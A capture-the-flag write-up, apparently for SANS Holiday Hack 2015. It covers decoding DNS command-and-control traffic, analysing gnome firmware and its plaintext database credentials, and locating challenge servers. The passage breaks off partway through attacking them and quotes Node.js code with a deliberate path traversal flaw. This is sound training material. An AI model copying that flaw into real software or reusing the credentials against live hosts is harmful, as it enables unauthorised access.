&lt;li&gt;&lt;a class="reference internal" href="#part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit" id="id7"&gt;Part 2: I’ll be Gnome for Christmas: &lt;em&gt;Firmware Analysis for Fun and Profit&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt" id="id8"&gt;Part 3: Let it Gnome! Let it Gnome! Let it Gnome! &lt;em&gt;Internet-Wide Scavenger Hunt&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-4-theres-no-place-like-gnome-for-the-holidays-gnomage-pwnage" id="id9"&gt;Part 4: There’s No Place Like Gnome for the Holidays: &lt;em&gt;Gnomage Pwnage&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id1" id="id10"&gt;SuperGnome01&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id2" id="id11"&gt;SuperGnome02&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id3" id="id12"&gt;SuperGnome03&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id4" id="id13"&gt;SuperGnome04&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id5" id="id14"&gt;SuperGnome05&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-5-baby-its-gnome-outside-sinister-plot-and-attribution" id="id15"&gt;Part 5: Baby, It’s Gnome Outside: &lt;em&gt;Sinister Plot and Attribution&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#first-capture-file" id="id16"&gt;First capture file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#second-capture-file" id="id17"&gt;Second capture file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#third-capture-file" id="id18"&gt;Third capture file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#fourth-capture-file" id="id19"&gt;Fourth capture file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#fifth-capture-file" id="id20"&gt;Fifth capture file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#let-s-unxor-the-images" id="id21"&gt;Let's unXOR the images&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#epilogue-twas-the-gnome-before-christmas-wrapping-it-all-up" id="id22"&gt;Epilogue: ‘Twas the Gnome Before Christmas: &lt;em&gt;Wrapping It All Up&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#conclusion" id="id23"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id6"&gt;Part 1: Dance of the Sugar Gnome Fairies: &lt;em&gt;Curious Wireless Packets&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We're given a &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-capture.pcap"&gt;PCAP file&lt;/a&gt; (sha256:
&lt;code&gt;655541fb645af45db68a739066325e2f1138812a6893254ae7b48acd9519a330&lt;/code&gt;),
and are asked to analyze it, to see what we can find.  If we open it with
Wireshark, we can see a lot of DNS traffic, with what looks
like base64-encoded data in the TXT fields.&lt;/p&gt;
&lt;img alt="giyh-capture_wireshark.png" class="align-center" src="/images/sans-christmas-challenge-2015/giyh-capture_wireshark.png" /&gt;
&lt;p&gt;Using DNS requests as a communication channel with a Command and Control server
is a well known trick to bypass traffic filtering, because outbound DNS is
often authorized on a local network. So, let's extract and decode the TXT
fields. tshark is particularly adapted for this task:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; tshark -r giyh-capture.pcap -Y dns -T fields -e dns.txt &lt;span class="p"&gt;|&lt;/span&gt; base64 -d &amp;gt; giyh-capture_decoded.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here, we ask tshark to focus on the DNS traffic, and to output only the TXT
fields. Now, let's take a look at the decoded file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat giyh-capture_decoded.txt
&lt;span class="go"&gt;NONE:NONE:NONE:NONE:NONE:NONE:NONE:EXEC:iwconfig&lt;/span&gt;
&lt;span class="go"&gt;EXEC:START_STATEEXEC:wlan0     IEEE 802.11abgn  ESSID:&amp;quot;DosisHome-Guest&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;EXEC:          Mode:Managed  Frequency:2.412 GHz  Cell: 7A:B3:B6:5E:A4:3F&lt;/span&gt;
&lt;span class="go"&gt;EXEC:          Tx-Power=20 dBm&lt;/span&gt;
&lt;span class="go"&gt;EXEC:          Retry short limit:7   RTS thr:off   Fragment thr:off&lt;/span&gt;
&lt;span class="go"&gt;EXEC:          Encryption key:off&lt;/span&gt;
&lt;span class="go"&gt;EXEC:          Power Management:off&lt;/span&gt;
&lt;span class="go"&gt;EXEC:&lt;/span&gt;
&lt;span class="go"&gt;EXEC:lo        no wireless extensions.&lt;/span&gt;
&lt;span class="go"&gt;EXEC:&lt;/span&gt;
&lt;span class="go"&gt;EXEC:eth0      no wireless extensions.&lt;/span&gt;
&lt;span class="go"&gt;EXEC:STOP_STATENONE:NONE:NONE:EXEC:cat /tmp/iwlistscan.txt&lt;/span&gt;
&lt;span class="go"&gt;EXEC:START_STATEEXEC:wlan0     Scan completed :&lt;/span&gt;
&lt;span class="go"&gt;EXEC:          Cell 01 - Address: 00:7F:28:35:9A:C7&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Channel:1&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Frequency:2.412 GHz (Channel 1)&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Quality=29/70  Signal level=-81 dBm&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Encryption key:on&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    ESSID:&amp;quot;CHC&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                              9 Mb/s; 12 Mb/s; 18 Mb/s&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Mode:Master&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Extra:tsf=000000412e67cddf&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    Extra: Last beacon: 5408ms ago&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 00055837335A36&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 010882848B960C121824&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 030101&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 200100&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: IEEE 802.11i/WPA2 Version 1&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                        Group Cipher : CCMP&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                        Pairwise Ciphers (1) : CCMP&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                        Authentication Suites (1) : PSK&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 2A0100&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 32043048606C&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: DD180050F2020101040003A4000027A4000042435E0062322F00&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 2D1A8C131BFFFF000000000000000000000000000000000000000000&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 3D1601080800000000000000000000000000000000000000&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: DD0900037F01010000FF7F&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: DD0A00037F04010000000000&lt;/span&gt;
&lt;span class="go"&gt;EXEC:                    IE: Unknown: 0706555320010B1B&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;EXEC:STOP_STATENONE:NONE:NONE:NONE:FILE:/root/Pictures/snapshot_CURRENT.jpg&lt;/span&gt;
&lt;span class="go"&gt;FILE:START_STATE,NAME=/root/Pictures/snapshot_CURRENT.jpgFILE:\xFF\xD8\xFF\xE0\x00\x10JFIF[raw binary]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, lots of stuff! We can see that some shell commands are executed, and there
seems to be the upload of a JPEG file. The commands and results seem to be
&lt;code&gt;EXEC:&lt;/code&gt;, and the upload of the file and the content with
&lt;code&gt;FILE:&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can recover the executed commands, which are &lt;code&gt;iwconfig&lt;/code&gt;, to see the
configuration of the different wirelass network interfaces of the gnome, and
&lt;code&gt;cat /tmp/iwlistscan.txt&lt;/code&gt;, which seems to give the result of the
&lt;code&gt;iwlist scan&lt;/code&gt; command, which scans available wireless networks.&lt;/p&gt;
&lt;p&gt;We can recover the content of the uploaded file, with the following commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; binwalk giyh-capture_decoded.txt &lt;span class="c1"&gt;# binwalk gives us the offset at which the JPEG file starts&lt;/span&gt;

&lt;span class="go"&gt;DECIMAL       HEXADECIMAL     DESCRIPTION&lt;/span&gt;
&lt;span class="go"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;4495          0x118F          JPEG image data, JFIF standard  1.01&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; dd &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;skip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4495&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;giyh-capture_decoded.txt &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/FILE://g&amp;#39;&lt;/span&gt; &amp;gt; giyh-capture_image.jpg &lt;span class="c1"&gt;# we skip the beginning of the decoded file, and remove the &amp;quot;FILE:&amp;quot; string from the result&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get the following image:&lt;/p&gt;
&lt;img alt="giyh-capture_image.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh-capture_image.jpg" /&gt;
&lt;p&gt;The flag for this part is &lt;code&gt;GnomeNET-NorthAmerica&lt;/code&gt;&lt;/p&gt;
&lt;img alt="first_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/first_flag_confirmation.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id7"&gt;Part 2: I’ll be Gnome for Christmas: &lt;em&gt;Firmware Analysis for Fun and Profit&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;After seeing such a strange and creepy behaviour (come on, man, you're taking
pictures of little kids' bedrooms), we are asked to analyze the firmware of
the gnome.&lt;/p&gt;
&lt;p&gt;We recover the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-firmware-dump.bin"&gt;firmware&lt;/a&gt; (sha256:
&lt;code&gt;bee93a79bb8ee2eba526494b4e6e56a601e1fa9589a1cccf7bfe61261ab8db20&lt;/code&gt;) from
Jessica. Now, time to analyze it! The best tool I know for file analysis is binwalk:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; binwalk giyh-firmware-dump.bin

&lt;span class="go"&gt;DECIMAL       HEXADECIMAL     DESCRIPTION&lt;/span&gt;
&lt;span class="go"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;0             0x0             PEM certificate&lt;/span&gt;
&lt;span class="go"&gt;1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)&lt;/span&gt;
&lt;span class="go"&gt;168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Using the &lt;code&gt;-e&lt;/code&gt; option form binwalk, we can extract the different files,
and unsquash the file system, to get a browsable version of the file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; binwalk -e giyh-firmware-dump.bin

&lt;span class="go"&gt;DECIMAL       HEXADECIMAL     DESCRIPTION&lt;/span&gt;
&lt;span class="go"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;0             0x0             PEM certificate&lt;/span&gt;
&lt;span class="go"&gt;1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)&lt;/span&gt;
&lt;span class="go"&gt;168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; _giyh-firmware-dump.bin.extracted/squashfs-root
&lt;span class="gp"&gt;$&lt;/span&gt; ls
&lt;span class="go"&gt;bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; cat etc/banner
&lt;span class="go"&gt;  _______                     ________        __&lt;/span&gt;
&lt;span class="go"&gt; |       |.-----.-----.-----.|  |  |  |.----.|  |_&lt;/span&gt;
&lt;span class="go"&gt; |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|&lt;/span&gt;
&lt;span class="go"&gt; |_______||   __|_____|__|__||________||__|  |____|&lt;/span&gt;
&lt;span class="go"&gt;          |__| W I R E L E S S   F R E E D O M&lt;/span&gt;
&lt;span class="go"&gt; -----------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt; DESIGNATED DRIVER (Bleeding Edge, r47650)&lt;/span&gt;
&lt;span class="go"&gt; -----------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;  * 2 oz. Orange Juice         Combine all juices in a&lt;/span&gt;
&lt;span class="go"&gt;  * 2 oz. Pineapple Juice      tall glass filled with&lt;/span&gt;
&lt;span class="go"&gt;  * 2 oz. Grapefruit Juice     ice, stir well.&lt;/span&gt;
&lt;span class="go"&gt;  * 2 oz. Cranberry Juice&lt;/span&gt;
&lt;span class="go"&gt; -----------------------------------------------------&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the firmware is based on OpenWRT, more specifically the
Designated Driver branch, which is the development branch. We can find
the architecture by looking at some binary files in the &lt;code&gt;bin&lt;/code&gt; folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; file bin/ash
&lt;span class="go"&gt;bin/ash: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The architecture of the gnome seems to be 32-bit ARM.&lt;/p&gt;
&lt;p&gt;We can see a &lt;code&gt;www&lt;/code&gt; folder at the root of the file system. Let's take a
look at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ls
&lt;span class="go"&gt;app.js  bin  files  node_modules  package.json  public  routes  views&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ls views
&lt;span class="go"&gt;cameras.jade  error.jade  files.jade  gnomenet.jade  index.jade  layout.jade  login.jade  network.jade  settings.jade&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The embedded web site seems to be a NodeJS website, using the Jade Node
Template Engine.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; head app.js
&lt;span class="go"&gt;var express = require(&amp;#39;express&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var path = require(&amp;#39;path&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var favicon = require(&amp;#39;serve-favicon&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var logger = require(&amp;#39;morgan&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var cookieParser = require(&amp;#39;cookie-parser&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var bodyParser = require(&amp;#39;body-parser&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var routes = require(&amp;#39;./routes/index&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var mongo = require(&amp;#39;mongodb&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var monk = require(&amp;#39;monk&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;var db = monk(&amp;#39;gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome&amp;#39;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the web site uses MongoDB as the database management system. We
can find the MongoDB files in the squashfs-root/opt/mongodb directory. Let's
copy them to a local install of MongoDB so that we can analyze them:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb
&lt;span class="gp"&gt;$&lt;/span&gt; sudo chown mongodb:nogroup /var/lib/mongodb/gnome.*
&lt;span class="gp"&gt;$&lt;/span&gt; sudo service mongodb start
&lt;span class="gp"&gt;$&lt;/span&gt; mongo gnome
&lt;span class="go"&gt;MongoDB shell version: 2.4.10&lt;/span&gt;
&lt;span class="go"&gt;connecting to: gnome&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt; show collections
&lt;span class="go"&gt;cameras&lt;/span&gt;
&lt;span class="go"&gt;settings&lt;/span&gt;
&lt;span class="go"&gt;status&lt;/span&gt;
&lt;span class="go"&gt;system.indexes&lt;/span&gt;
&lt;span class="go"&gt;users&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt; db.users.find&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;56229f58809473d11033515b&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;user&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;user&amp;quot;, &amp;quot;user_level&amp;quot; : 10 }&lt;/span&gt;
&lt;span class="go"&gt;{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;56229f63809473d11033515c&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;admin&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;SittingOnAShelf&amp;quot;, &amp;quot;user_level&amp;quot; : 100 }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the credentials are stored in plaintext, which is a big no-no.
The credentials to connect to the gnome web interface as an administrator are
&lt;code&gt;admin/SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The flag for this part is &lt;code&gt;SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;img alt="second_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/second_flag_confirmation.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id8"&gt;Part 3: Let it Gnome! Let it Gnome! Let it Gnome! &lt;em&gt;Internet-Wide Scavenger Hunt&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The gnomes are apparently commanded by five SuperGnomes, which are the C&amp;amp;C
servers. How can we identify them? Jessica tells us that we can &lt;em&gt;sho Dan&lt;/em&gt; the
password information we found. It took me a while (shame on me) to understand
that it was a clue given to us to use the famous Shodan website to identify
the SuperGnomes present on the Internet.&lt;/p&gt;
&lt;img alt="jessica_shodan" class="align-center" src="/images/sans-christmas-challenge-2015/jessica_shodan.png" /&gt;
&lt;p&gt;If we look back at the traffic capture from the first part of this write-up,
we can see that the gnome is communicating with a server named
cmd.sg1.atnascorp.com.&lt;/p&gt;
&lt;p&gt;Let's take the string &amp;quot;atnascorp&amp;quot; and search it in Shodan. You can find the
result at &lt;a class="reference external" href="https://www.shodan.io/search?query=atnascorp"&gt;this URL&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="shodan_result" class="align-center" src="/images/sans-christmas-challenge-2015/shodan_result.png" /&gt;
&lt;p&gt;From the traffic analysis and the results from Shodan, we have found the five
SuperGnomes:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)&lt;/li&gt;
&lt;li&gt;SuperGnome02: 52.34.3.80, located in United States, Portland (OR)&lt;/li&gt;
&lt;li&gt;SuperGnome03: 52.64.191.71, located in Australia, Sydney&lt;/li&gt;
&lt;li&gt;SuperGnome04: 52.192.152.132, located in Japan, Tokyo&lt;/li&gt;
&lt;li&gt;SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These targets were confirmed by the Great and Powerful Oracle, Tom Hessman.&lt;/p&gt;
&lt;img alt="third_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/third_flag_confirmation.png" /&gt;
&lt;p&gt;No flag for this part.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="part-4-theres-no-place-like-gnome-for-the-holidays-gnomage-pwnage"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id9"&gt;Part 4: There’s No Place Like Gnome for the Holidays: &lt;em&gt;Gnomage Pwnage&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Now, it's time to compromise these SuperGnomes! To prove that we have control
of the SuperGnomes, we must recover the content of
&lt;code&gt;/gnome/www/files/gnome.conf&lt;/code&gt;.&lt;/p&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.2.229.189/"&gt;SuperGnome01&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;This SuperGnome is the easiest of them all. Indeed, you just have to connect
to the web interface with the credentials found during the firmware analysis.
You can then go to the files tab, and download the configuration file:&lt;/p&gt;
&lt;img alt="sg01_w00t" class="align-center" src="/images/sans-christmas-challenge-2015/sg01_w00t.png" /&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;NCC1701&lt;/code&gt;
(&lt;a class="reference external" href="https://en.wikipedia.org/wiki/USS_Enterprise_%28NCC-1701%29"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.34.3.80/"&gt;SuperGnome02&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;When we connect to SuperGnome02, we can go the files tab, but we can't download
any file.&lt;/p&gt;
&lt;img alt="sg02_download_fail.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg02_download_fail.png" /&gt;
&lt;p&gt;However, there is a path traversal vulnerability in the web backend
of the SuperGnome:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File www/route/index.js, line 182&lt;/span&gt;
&lt;span class="c1"&gt;// CAMERA VIEWER&lt;/span&gt;
&lt;span class="c1"&gt;// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cam&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;query&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;  &lt;span class="c1"&gt;// check for .png&lt;/span&gt;
  &lt;span class="c1"&gt;//if (camera.indexOf(&amp;#39;.png&amp;#39;) == -1) // STUART: Removing this...I think this is a better solution... right?&lt;/span&gt;
  &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// add .png if its not found&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cam:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./public/images/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;F_OK&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;R_OK&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;File ./public/images/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; does not exist or access denied!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
